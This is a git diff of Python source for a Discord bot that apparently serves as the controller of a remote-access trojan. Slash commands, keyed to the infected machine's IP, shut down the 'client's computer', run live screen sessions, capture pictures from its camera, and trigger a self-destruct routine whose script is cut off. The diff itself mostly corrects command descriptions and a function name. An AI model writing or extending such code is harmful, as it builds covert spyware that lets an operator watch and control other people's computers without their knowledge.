@@ -122,7 +122,7 @@ testServerId = [1139988299386195981]
 
 
 
-@client.slash_command(guild_ids=testServerId, description="Shuts down the computer")
+@client.slash_command(guild_ids=testServerId, description="Shuts down the client's computer.")
 async def shutdown(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
@@ -193,7 +193,7 @@ async def start_lq_live_session(interaction : Interaction):
         await interaction.send(embed=embed)
         await interaction.delete_original_message()
 
-@client.slash_command(guild_ids=testServerId, description="Starts a low quality live session of the client's view.")
+@client.slash_command(guild_ids=testServerId, description="Stops live session.")
 async def stop_live_session(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
@@ -211,7 +211,7 @@ async def stop_live_session(interaction : Interaction):
         await interaction.send(embed=embed)
         await interaction.delete_original_message()
 
-@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
+@client.slash_command(guild_ids=testServerId, description="Sends a picture off of the client's camera.")
 async def take_picture(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
@@ -239,14 +239,14 @@ async def take_picture(interaction : Interaction):
                 await interaction.send(embed=embed, file=file)
                 await interaction.delete_original_message()
 
-@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
-async def self_distruct(interaction : Interaction):
+@client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
+async def self_destruct(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
         
         user_id = interaction.user.id
         await interaction.response.send_message("Self-destructing client...")
-        await interaction.response.send_message("Client most likely self destructed!")
+        await interaction.edit_original_message(content="Client most likely self destructed!")
         script_content = """
 import shutil
 import os
